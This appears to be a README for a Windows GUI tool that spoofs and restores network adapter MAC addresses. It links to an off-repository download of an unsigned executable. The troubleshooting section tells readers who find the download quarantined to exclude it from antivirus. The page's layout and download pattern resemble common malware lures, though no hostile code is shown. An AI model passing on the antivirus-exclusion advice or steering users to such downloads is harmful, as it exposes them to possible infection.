<div align="center">

<img src="assets/banner.svg" width="100%" alt="MAC Address Changer banner"/>

# mac-address-changer-tool 🔀🛡️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Spin up a new network identity in three clicks — no terminal required.*

</div>

---

## 🚀 Quick Start

**TL;DR: download → run → pick adapter → new MAC in seconds.**

1. Grab the latest build from the landing page button below ⬇️
2. Launch `mac-address-changer-tool.exe` — no setup wizard, no bloat
3. Select your network adapter, choose **Random** or **Custom**, hit **Apply**

> [!TIP]
> Pin the app to your taskbar if you swap MACs often — the tray icon shows your current address at a glance.

---

## 🧭 Overview

**TL;DR: a lightweight Windows utility that rewrites your NIC's MAC address, safely and reversibly.**

Every network interface ships with a factory-burned MAC address — a 48-bit fingerprint that routers, access points, and network logs quietly remember. `mac-address-changer-tool` exists because that fingerprint shouldn't be permanent by default. Whether you're testing how a captive portal treats new devices, isolating a flaky driver issue, or simply reclaiming a bit of privacy on a shared network, this tool gives you a clean lever to pull.

We built it for network engineers debugging DHCP reservations, privacy-conscious users tired of being tracked by MAC-based fingerprinting, QA testers simulating multiple devices, and hobbyists tinkering with home lab setups. No CLI gymnastics, no registry-editing tutorials copy-pasted from forums — just a focused GUI that does one job well.

Under the hood, this is a **MAC address changer** in the truest sense: it talks directly to the Windows adapter registry, applies the change at the driver level, and restores connectivity automatically. It's the tool you reach for when "just restart your router" isn't an option.

<p align="center">
  <a href="https://ExitGullGallery.github.io/mac-address-changer-tool/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-2563EB?style=for-the-badge&logo=windows&logoColor=white&labelColor=1D4ED8" width="550" alt="Download"/>
  </a>
</p>

---

## ⚡ What It Actually Does

**TL;DR: randomize, spoof, restore, automate — one panel handles it all.**

- **Randomized spoofing** — generate a fully compliant, vendor-plausible MAC in one click, no manual byte-fiddling
- **Custom address entry** — type any 12-hex-digit value with live validation, typos caught before you apply
- **One-click restore** — snap back to the factory MAC instantly, no reboot archaeology needed
- **Adapter auto-discovery** — every Ethernet and Wi-Fi NIC on the system is detected and listed by friendly name
- **Persistent profiles** — save your favorite spoofed identities and reapply them across sessions
- **Vendor OUI awareness** — pick a manufacturer prefix so the new address blends into real-world traffic
- **Startup automation** — optionally rotate your MAC every time Windows boots
- **Change history log** — every swap is timestamped locally so you always know what you had before

> [!NOTE]
> This is a **MAC address changer**, not a MAC address *spoiler* for your ISP contract — some networks bind service to a specific MAC. Know your environment.

---

## 🧩 Getting Started, Properly

**TL;DR: four steps, zero installers, done in under a minute.**

1. Visit the landing page and download the current build
2. Extract if zipped, then run the `.exe` — Windows may show a SmartScreen prompt on first launch
3. Choose your adapter from the dropdown list
4. Pick **Randomize** or **Custom**, click **Apply**, and watch the adapter reset itself

> [!IMPORTANT]
> Applying a new MAC briefly disconnects the adapter. Save your work before hitting **Apply** on your primary connection.

---

## 🖥️ System Requirements

**TL;DR: Windows 10/11, nothing else.**

| Requirement | Detail |
|---|---|
| OS | Windows 10 (64-bit) or Windows 11 |
| Dependencies | None — fully standalone executable |
| Disk space | Under 15 MB |
| Privileges | Administrator (required to touch adapter settings) |
| Network | Any Ethernet or Wi-Fi NIC exposed by Windows |

![Standalone](https://img.shields.io/badge/dependencies-none-success?style=flat-square) ![Arch](https://img.shields.io/badge/build-x64-lightgrey?style=flat-square) ![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)

---

## ⚙️ How It Works

**TL;DR: pick adapter → generate/enter MAC → write to registry → reset NIC → verify.**

The tool reads the adapter list straight from Windows' network stack, writes the new address into the adapter's registry-backed configuration, then cycles the adapter driver so the change takes effect without a full reboot. A verification pass confirms the OS reports the address you asked for.

```mermaid
flowchart LR
    Start --> SelectAdapter
    SelectAdapter --> GenerateMAC
    GenerateMAC --> ApplyChange
    ApplyChange --> ResetAdapter
    ResetAdapter --> Verified
```

<details>
<summary><strong>Why does the adapter need to reset?</strong></summary>

Windows caches the MAC address at the driver binding layer. A soft reset forces the driver to re-read its configuration, which is the only way the new address actually gets used by the network stack — no full system restart required.

</details>

---

## 🩹 Troubleshooting

**TL;DR: most issues trace back to permissions or driver quirks — here's the fix list.**

**Q: The app opens but the adapter list is empty.**
A: Relaunch as Administrator — Windows hides adapter write-access from standard accounts.

**Q: My MAC reverted after a reboot.**
A: Some drivers reset to factory MAC on cold boot. Enable **Startup Automation** in Settings to reapply on every login.

**Q: Wi-Fi disconnects and won't reconnect after applying.**
A: Toggle Wi-Fi off/on manually once — a small number of wireless drivers need a manual nudge post-reset.

**Q: The app flags "adapter not supported."**
A: A handful of virtual/tunnel adapters block MAC rewrites at the driver level. This is a Windows/driver limitation, not a bug in the tool.

**Q: Antivirus quarantined the download.**
A: Low-reputation flags are common for new, unsigned network utilities. Verify the file hash from the landing page before excluding it.

> [!WARNING]
> Changing the MAC on a network-managed corporate device may violate your organization's IT policy. Check before you spoof on work hardware.

---

## 🎨 UI / UX Details

**TL;DR: dark by default, keyboard-friendly, and it remembers your last session.**

- `Ctrl+R` — instantly randomize the current adapter's MAC
- `Ctrl+Z` — restore the original factory address
- `Ctrl+S` — save the current address as a named profile
- `F5` — refresh the adapter list
- **Themes:** Dark (default), Light, and a high-contrast Accessibility mode
- **Settings panel:** toggle startup automation, change-log retention, and OUI vendor filtering

> [!TIP]
> Right-click any adapter row for a quick context menu — restore, save profile, or copy the current MAC to clipboard.

---

## 🤝 Contributing & Community

**TL;DR: issues, PRs, and ideas are all welcome — this is a community-driven project.**

Found a bug in adapter detection? Have a driver edge case we haven't handled? Open an issue. Want to add OUI vendor packs or a new theme? Pull requests are reviewed regularly.

- ⭐ Star the repo if this tool saved you a headache
- 🐛 Report issues with your Windows build and adapter model attached
- 💡 Propose features via discussions before opening large PRs

---

## 📄 License

**TL;DR: MIT, 2026, do what you want — just keep the notice.**

Released under the [MIT License](LICENSE). Free to use, modify, and redistribute.

---

## ⚠️ Disclaimer

**TL;DR: use responsibly, on hardware and networks you're authorized to configure.**

`mac-address-changer-tool` is provided for legitimate networking, testing, privacy, and educational purposes. You are responsible for complying with your organization's policies, your ISP's terms of service, and applicable local law. The maintainers assume no liability for misuse.

<p align="center">
  <a href="https://ExitGullGallery.github.io/mac-address-changer-tool/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-2026-2563EB?style=for-the-badge&logo=windows&logoColor=white&labelColor=1D4ED8" width="550" alt="Download"/>
  </a>
</p>